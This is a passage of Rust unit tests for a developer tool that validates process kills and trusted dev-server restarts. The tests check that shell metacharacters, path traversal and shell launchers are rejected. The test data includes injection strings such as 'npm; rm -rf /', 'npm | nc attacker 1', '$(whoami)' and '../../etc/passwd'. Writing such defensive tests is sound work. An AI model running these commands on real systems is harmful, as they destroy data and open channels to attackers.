        assert!(!is_unattributed_pid(1));
        assert!(!is_unattributed_pid(2));
    }

    #[test]
    fn a_pid_one_listener_is_listed_but_not_killable() {
        // The visible-but-protected contract for socket-activated listeners:
        // the scanners keep the row, and the kill guard is what refuses it.
        assert!(
            !is_unattributed_pid(1),
            "a PID 1 listener must not be filtered out of the listing"
        );
        let error = validate_kill(1, &[listener(1, 8080, "systemd")], &[]).unwrap_err();
        assert_eq!(error.code, "invalid_pid");
    }

    #[test]
    fn kill_rejects_reserved_pids_before_anything_else() {
        // The listing filters and the kill guard must agree on what is
        // reserved; this pins the guard to the shared predicate.
        for pid in [0, 1] {
            let error = validate_kill(pid, &[listener(pid, 3000, "node")], &[]).unwrap_err();
            assert_eq!(error.code, "invalid_pid");
        }
        // Still observed-checked, not reserved, for a normal pid.
        let error = validate_kill(4321, &[], &[]).unwrap_err();
        assert_eq!(error.code, "not_observed");
    }

    // ─── Trusted restart ─────────────────────────────────────────────────

    fn project(dir: &tempfile::TempDir) -> PathBuf {
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        fs::canonicalize(dir.path()).unwrap()
    }

    fn record(root: &Path, program: &str, args: &[&str]) -> LaunchRecord {
        LaunchRecord {
            program: program.to_string(),
            args: args.iter().map(|a| a.to_string()).collect(),
            cwd: root.to_path_buf(),
            root: root.to_path_buf(),
        }
    }

    #[test]
    fn reject_unsafe_token_blocks_shell_metacharacters() {
        for token in [
            "npm && calc.exe",
            "npm; rm -rf /",
            "npm | nc attacker 1",
            "$(whoami)",
            "`whoami`",
            "run > out.txt",
            "run < in.txt",
            "%APPDATA%",
            "~/evil",
            "dev*",
            "dev?",
            "a\nb",
            "a\"b",
            "a'b",
            "^cmd",
            "!DELAYED!",
            "{a,b}",
            "[a]",
            "#comment",
        ] {
            assert!(
                reject_unsafe_token(token, "argument").is_err(),
                "expected {:?} to be rejected",
                token
            );
        }
    }

    #[test]
    fn reject_unsafe_token_blocks_traversal_and_empty() {
        assert!(reject_unsafe_token("", "argument").is_err());
        assert!(reject_unsafe_token("../../etc/passwd", "argument").is_err());
        assert!(reject_unsafe_token("..\\..\\windows", "argument").is_err());
        assert!(reject_unsafe_token("a\0b", "argument").is_err());
    }

    #[test]
    fn reject_unsafe_token_allows_ordinary_arguments() {
        for token in [
            "run",
            "dev",
            "--port=5173",
            "src/index.js",
            "C:\\bin\\node.exe",
            "-m",
        ] {
            assert!(
                reject_unsafe_token(token, "argument").is_ok(),
                "{:?}",
                token
            );
        }
    }

    #[test]
    fn program_basename_allowlist() {
        assert!(program_basename_allowed("npm"));
        assert!(program_basename_allowed("node"));
        assert!(program_basename_allowed(
            "C:\\Program Files\\nodejs\\node.exe"
        ));
        assert!(program_basename_allowed("/usr/local/bin/python3"));
        // Shell-interpreted launchers and anything off the list stay out.
        assert!(!program_basename_allowed("npm.cmd"));
        assert!(!program_basename_allowed("evil.bat"));
        assert!(!program_basename_allowed("payload.ps1"));
        assert!(!program_basename_allowed("cmd"));
        assert!(!program_basename_allowed("sh"));
        assert!(!program_basename_allowed("powershell.exe"));
    }

    #[test]
    fn validate_accepts_an_allowlisted_interpreter_inside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "npm", &["run", "dev"])).is_ok());
    }

    #[test]
    fn validate_accepts_a_subdirectory_cwd() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let sub = root.join("apps/web");
        fs::create_dir_all(&sub).unwrap();
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = fs::canonicalize(&sub).unwrap();
        assert!(validate_launch_record(&rec).is_ok());
    }

    #[test]
    fn validate_rejects_metacharacters_in_program_and_args() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "npm & calc", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "npm", &["run", "dev && calc"])).is_err());
        assert!(validate_launch_record(&record(&root, "npm", &["$(id)"])).is_err());
    }

    #[test]
    fn validate_rejects_programs_that_are_not_allowlisted_or_jailed() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "calc", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "sh", &["-c", "id"])).is_err());
        // Relative paths never resolve against a predictable directory.
        assert!(validate_launch_record(&record(&root, "./evil", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "sub/evil", &[])).is_err());
    }

    #[test]
    fn validate_accepts_an_absolute_program_inside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        // Use the non-verbatim path the OS would actually report for argv[0].
        let binary = dir.path().join("server");
        fs::write(&binary, "").unwrap();
        let rec = record(&root, binary.to_str().unwrap(), &[]);
        assert!(validate_launch_record(&rec).is_ok());
    }

    #[test]
    fn validate_rejects_shell_launchers_inside_the_project() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        for name in [
            "start.cmd",
            "start.BAT",
            "script.ps1",
            "cmd.exe",
            "powershell.exe",
            "pwsh.exe",
            "sh",
            "bash",
        ] {
            let binary = dir.path().join(name);
            fs::write(&binary, "").unwrap();
            let rec = record(&root, binary.to_str().unwrap(), &["ordinary argument"]);
            assert!(validate_launch_record(&rec).is_err(), "accepted {name}");
        }
    }

    #[test]
    fn direct_spawn_preserves_argument_boundaries() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let source = dir.path().join("probe.rs");
        let binary = dir
            .path()
            .join(format!("argument probe{}", std::env::consts::EXE_SUFFIX));
        // A native child reports exactly what it received, without a shell or
        // another language runtime interpreting its command line.
        fs::write(
            &source,
            r#"
            fn main() {
                let args: Vec<String> = std::env::args().skip(1).collect();
                std::fs::write("received.txt", format!("{:?}", args)).unwrap();
            }
        "#,
        )
        .unwrap();
        assert!(Command::new("rustc")
            .arg(&source)
            .arg("-o")
            .arg(&binary)
            .status()
            .unwrap()
            .success());
        let args = ["ordinary", "path with spaces", "trailing\\", "two  spaces"];
        let cmd = std::iter::once(binary.to_str().unwrap().to_string())
            .chain(args.iter().map(|arg| arg.to_string()))
            .collect::<Vec<_>>();
        let mut rec = build_launch_record(&cmd, Some(&root)).unwrap();
        assert_eq!(rec.args, args);
        // Exercise the spawn sink with punctuation as well: even if validation
        // changes later, these must remain literal arguments, never shell code.
        rec.args.extend(
            [
                "& echo injected > injected.txt",
                "a|b",
                "a^b",
                "a\"b",
                "",
                "%PATH%",
            ]
            .iter()
            .map(|arg| arg.to_string()),
        );
        let mut child = spawn_trusted(&rec).unwrap();
        let output = root.join("received.txt");
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        let expected = format!("{:?}", rec.args);
        loop {
            if fs::read_to_string(&output).ok().as_deref() == Some(&expected) {
                break;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "child did not report exact argv"
            );
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        // Reap the helper. It has already written its output, so this returns
        // immediately; without it the Child is dropped unwaited and the test
        // leaves a zombie behind on Unix.
        child.wait().unwrap();
        assert!(!root.join("injected.txt").exists());
    }

    #[test]
    fn validate_rejects_an_absolute_program_outside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let outside = tempdir().unwrap();
        let binary = outside.path().join("evil");
        fs::write(&binary, "").unwrap();
        let rec = record(&root, binary.to_str().unwrap(), &[]);
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn validate_rejects_a_cwd_outside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let outside = tempdir().unwrap();
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = fs::canonicalize(outside.path()).unwrap();
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn validate_rejects_a_nonexistent_cwd() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = root.join("does-not-exist");
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn canonicalize_jailed_rejects_traversal_unc_and_expansions() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let sub = root.join("app");
        fs::create_dir_all(&sub).unwrap();

        assert!(canonicalize_jailed(&sub, &root).is_ok());
        assert!(canonicalize_jailed(&sub.join("../.."), &root).is_err());
        assert!(canonicalize_jailed(Path::new("\\\\evil\\share"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("~/projects"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("%APPDATA%"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("$HOME/x"), &root).is_err());
        assert!(canonicalize_jailed(Path::new(""), &root).is_err());
    }

    #[test]
    fn build_launch_record_captures_a_vetted_dev_server() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let cmd: Vec<String> = ["npm", "run", "dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let rec = build_launch_record(&cmd, Some(&root)).expect("record");
        assert_eq!(rec.program, "npm");
        assert_eq!(rec.args, vec!["run".to_string(), "dev".to_string()]);
        assert_eq!(rec.cwd, root);
        assert_eq!(rec.root, root);
    }

    #[test]
    fn build_launch_record_fails_closed() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        // No project marker within the 6 levels above the cwd -> no jail -> no record.
        let bare = tempdir().unwrap();
        let unmarked = bare.path().join("a/b/c/d/e/f/g");
        fs::create_dir_all(&unmarked).unwrap();
        let cmd: Vec<String> = ["npm".to_string(), "run".to_string()].to_vec();
        assert!(build_launch_record(&cmd, Some(&unmarked)).is_none());
        // No cwd at all.
        assert!(build_launch_record(&cmd, None).is_none());
        // Empty argv.
        assert!(build_launch_record(&[], Some(&root)).is_none());
        // Disallowed program.
        let evil: Vec<String> = ["cmd".to_string(), "/C".to_string()].to_vec();
        assert!(build_launch_record(&evil, Some(&root)).is_none());
    }

    #[test]
    fn restart_trusted_refuses_an_unknown_port_and_pid() {
        let err = restart_trusted(65535, 4_294_967_290).unwrap_err();
        assert!(err.contains("no trusted launch record"), "{}", err);
    }

    #[test]
    fn dedupe_seen_entries() {
        let mut seen: HashSet<(u16, u32)> = HashSet::new();
        assert!(seen.insert((3000, 1234)));
        assert!(!seen.insert((3000, 1234))); // duplicate
        assert!(seen.insert((3000, 5678))); // same port, different pid
        assert!(seen.insert((5173, 1234))); // different port, same pid
        assert_eq!(seen.len(), 3);
    }

    // ─── lsof -Fpn cwd records ───────────────────────────────────────────

    #[test]
    fn parses_a_batched_lsof_cwd_listing() {
        // One spawn now covers every pid, so the parser has to keep each
        // path with the process block it appeared under.
        let out = parse_lsof_cwd_records(
            "p501
n/Users/me/projects/api
p777
n/Users/me/projects/web
",
        );
        assert_eq!(out.len(), 2);
        assert_eq!(
            out.get(&501),
            Some(&PathBuf::from("/Users/me/projects/api"))
        );
        assert_eq!(
            out.get(&777),
            Some(&PathBuf::from("/Users/me/projects/web"))
        );
    }

    #[test]
    fn keeps_paths_that_contain_spaces() {
        // `-F` output is one field per line, so a space is part of the path
        // and must not be tokenized away.
        let out = parse_lsof_cwd_records(
            "p42
n/Users/me/My Project/server
",
        );
        assert_eq!(
            out.get(&42),
            Some(&PathBuf::from("/Users/me/My Project/server"))
        );
    }

    #[test]
    fn omits_a_process_whose_cwd_was_not_reported() {
        // lsof prints the process block but no `n` line for a directory it
        // could not read; that pid simply gets no project attributed.
        let out = parse_lsof_cwd_records(
            "p501
n/Users/me/a
p502
p503
n/Users/me/c
",
        );
        assert_eq!(out.len(), 2);
        assert_eq!(out.get(&501), Some(&PathBuf::from("/Users/me/a")));
        assert_eq!(out.get(&502), None);
        assert_eq!(out.get(&503), Some(&PathBuf::from("/Users/me/c")));
    }

    #[test]
    fn an_unreadable_pid_line_does_not_misattribute_the_path_below_it() {
        let out = parse_lsof_cwd_records(
            "p501
n/Users/me/a
pBOGUS
n/Users/me/orphan
",
        );
        assert_eq!(out.get(&501), Some(&PathBuf::from("/Users/me/a")));
        assert_eq!(
            out.len(),
            1,
            "orphaned path was attributed to a process: {out:?}"
        );
    }

    #[test]
    fn ignores_empty_input_and_unrelated_field_lines() {
        assert!(parse_lsof_cwd_records("").is_empty());
        assert!(parse_lsof_cwd_records(
            "

"
        )
        .is_empty());
        // A bare `n` with no path, and fields we did not ask for.
        assert!(parse_lsof_cwd_records(
            "p501
fcwd
n
"
        )
        .is_empty());
    }
}
